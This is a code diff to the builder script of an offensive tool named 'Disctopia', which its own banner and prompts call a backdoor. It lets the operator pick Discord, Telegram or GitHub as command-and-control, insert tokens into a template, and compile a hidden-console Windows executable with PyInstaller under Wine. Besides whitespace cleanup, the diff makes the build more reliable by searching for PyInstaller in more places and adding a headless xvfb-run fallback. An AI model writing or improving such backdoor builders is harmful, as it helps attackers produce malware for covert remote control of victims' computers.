@@ -18,16 +18,16 @@ def clear_screen():
 clear_screen()
 
 print('''
-▓█████▄  ██▓  ██████  ▄████▄  ▄▄▄█████▓ ▒█████   ██▓███   ██▓ ▄▄▄      
-▒██▀ ██▌▓██▒▒██    ▒ ▒██▀ ▀█  ▓  ██▒ ▓▒▒██▒  ██▒▓██░  ██▒▓██▒▒████▄    
-░██   █▌▒██▒░ ▓██▄   ▒▓█    ▄ ▒ ▓██░ ▒░▒██░  ██▒▓██░ ██▓▒▒██▒▒██  ▀█▄  
-░▓█▄   ▌░██░  ▒   ██▒▒▓▓▄ ▄██▒░ ▓██▓ ░ ▒██   ██░▒██▄█▓▒ ▒░██░░██▄▄▄▄██ 
+▓█████▄  ██▓  ██████  ▄████▄  ▄▄▄█████▓ ▒█████   ██▓███   ██▓ ▄▄▄
+▒██▀ ██▌▓██▒▒██    ▒ ▒██▀ ▀█  ▓  ██▒ ▓▒▒██▒  ██▒▓██░  ██▒▓██▒▒████▄
+░██   █▌▒██▒░ ▓██▄   ▒▓█    ▄ ▒ ▓██░ ▒░▒██░  ██▒▓██░ ██▓▒▒██▒▒██  ▀█▄
+░▓█▄   ▌░██░  ▒   ██▒▒▓▓▄ ▄██▒░ ▓██▓ ░ ▒██   ██░▒██▄█▓▒ ▒░██░░██▄▄▄▄██
 ░▒████▓ ░██░▒██████▒▒▒ ▓███▀ ░  ▒██▒ ░ ░ ████▓▒░▒██▒ ░  ░░██░ ▓█   ▓██▒
  ▒▒▓  ▒ ░▓  ▒ ▒▓▒ ▒ ░░ ░▒ ▒  ░  ▒ ░░   ░ ▒░▒░▒░ ▒▓▒░ ░  ░░▓   ▒▒   ▓▒█░
  ░ ▒  ▒  ▒ ░░ ░▒  ░ ░  ░  ▒       ░      ░ ▒ ▒░ ░▒ ░      ▒ ░  ▒   ▒▒ ░
- ░ ░  ░  ▒ ░░  ░  ░  ░          ░      ░ ░ ░ ▒  ░░        ▒ ░  ░   ▒   
+ ░ ░  ░  ▒ ░░  ░  ░  ░          ░      ░ ░ ░ ▒  ░░        ▒ ░  ░   ▒
    ░     ░        ░  ░ ░                   ░ ░            ░        ░  ░ v2.1.2
- ░                   ░                                                 
+ ░                   ░
 
 Made by Dimitris Kalopisis aka Ectos | Twitter: @DKalopisis \n\nRun 'help use' to get started!''')
 
@@ -56,7 +56,7 @@ def createTable(list):
 payload = ""
 try:
     while True:
-        
+
         command = input(f"[+] {payload} > ")
         command_list = command.split()
 
@@ -74,19 +74,19 @@ try:
                 if command_list[1] == "discord":
                     print("[+] Using Discord C2")
                     payload = "discord"
-                    table = createTable(list)    
+                    table = createTable(list)
                     print(f"\n{table.get_string(title='Disctopia Backdoor Settings')}")
                     print("Run 'help set' for more information\n")
                 elif command_list[1] == "telegram":
                     print("[+] Using Telegram C2")
                     payload = "telegram"
-                    table = createTable(list)    
+                    table = createTable(list)
                     print(f"\n{table.get_string(title='Disctopia Backdoor Settings')}")
                     print("Run 'help set' for more information\n")
                 elif command_list[1] == "github":
                     print("[+] Using Github C2")
                     payload = "github"
-                    table = createTable(list)    
+                    table = createTable(list)
                     print(f"\n{table.get_string(title='Disctopia Backdoor Settings')}")
                     print("Run 'help set' for more information\n")
                 else:
@@ -138,7 +138,7 @@ try:
                 print('''\n
         Help Menu:
 
-        "help <command>" Displays more help for a specific command 
+        "help <command>" Displays more help for a specific command
 
         "use <payload>" Selects a payload to use
 
@@ -217,8 +217,8 @@ try:
 
         elif command_list[0] == "build":
             print("[?] Are you sure you want to build the backdoor? (y/n)")
-            input = input()
-            if input == "y":
+            confirm = input()
+            if confirm == "y":
                 print("[+] Building backdoor...")
                 if payload == "discord":
                     f = open("code/discord/main.py", 'r')
@@ -242,20 +242,57 @@ try:
                     f.close()
                     newfile = file.replace("{TOKEN}", str(list[1]))
                     newfile = newfile.replace("{REPO}", str(list[2]))
-                
+
 
                 f = open(list[0]+".py", 'w')
                 f.write(newfile)
                 f.close()
 
-                if os.path.exists('~/.wine/drive_c/users/root/Local Settings/Application Data/Programs/Python/Python38-32/Scripts/pyinstaller.exe'):
-                    path_to_pyinstaller = os.path.expanduser('~/.wine/drive_c/users/root/Local Settings/Application Data/Programs/Python/Python38-32/Scripts/pyinstaller.exe')
-                else:
-                    path_to_pyinstaller = os.path.expanduser('~/.wine/drive_c/users/root/AppData/Local/Programs/Python/Python38-32/Scripts/pyinstaller.exe')
-                
-                if "Arch" in distro.name() or "Manjaro" in distro.name():
-                    path_to_pyinstaller = os.path.expanduser('~/.wine/drive_c/users/root/Local Settings/Application Data/Programs/Python/Python38-32/Scripts/pyinstaller.exe')
+                user_home = os.path.expanduser("~")
+                current_user = os.environ.get("USER") or os.environ.get("USERNAME") or "root"
+
+                potential_paths = [
+                    f"{user_home}/.wine/drive_c/users/{current_user}/Local Settings/Application Data/Programs/Python/Python38-32/Scripts/pyinstaller.exe",
+                    f"{user_home}/.wine/drive_c/users/{current_user}/AppData/Local/Programs/Python/Python38-32/Scripts/pyinstaller.exe",
+                    f"{user_home}/.wine/drive_c/users/root/Local Settings/Application Data/Programs/Python/Python38-32/Scripts/pyinstaller.exe",
+                    f"{user_home}/.wine/drive_c/users/root/AppData/Local/Programs/Python/Python38-32/Scripts/pyinstaller.exe",
+                    f"{user_home}/.wine/drive_c/users/Public/Local Settings/Application Data/Programs/Python/Python38-32/Scripts/pyinstaller.exe",
+                    f"{user_home}/.wine/drive_c/users/Public/AppData/Local/Programs/Python/Python38-32/Scripts/pyinstaller.exe",
+                ]
+
+                path_to_pyinstaller = ""
+                for path in potential_paths:
+                    if os.path.exists(path):
+                        path_to_pyinstaller = path
+                        break
+
+                if not path_to_pyinstaller:
+                    # Try a more aggressive search if we are on Linux
+                    try:
+                        find_cmd = f"find {user_home}/.wine/drive_c/users -name pyinstaller.exe 2>/dev/null"
+                        found_paths = subprocess.check_output(find_cmd, shell=True).decode().splitlines()
+                        for path in found_paths:
+                            if "Python38-32" in path:
+                                path_to_pyinstaller = path
+                                break
+                    except:
+                        pass
+
+                if not path_to_pyinstaller:
+                    print("[!] Could not find pyinstaller.exe in Wine environment.")
+                    print("[!] Please make sure you have run setup.sh correctly.")
+                    continue
+
                 compile_command = ["wine", path_to_pyinstaller, "--onefile", "--noconsole", "--icon=img/exe_file.ico", list[0]+".py"]
+
+                # Check for headless environment and use xvfb-run if necessary
+                if OS == "linux" and not os.environ.get("DISPLAY"):
+                    try:
+                        subprocess.check_call(["which", "xvfb-run"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                        compile_command.insert(0, "xvfb-run")
+                        print("[+] No DISPLAY found, using xvfb-run for headless build")
+                    except subprocess.CalledProcessError:
+                        pass
 
                 subprocess.call(compile_command)
                 try:
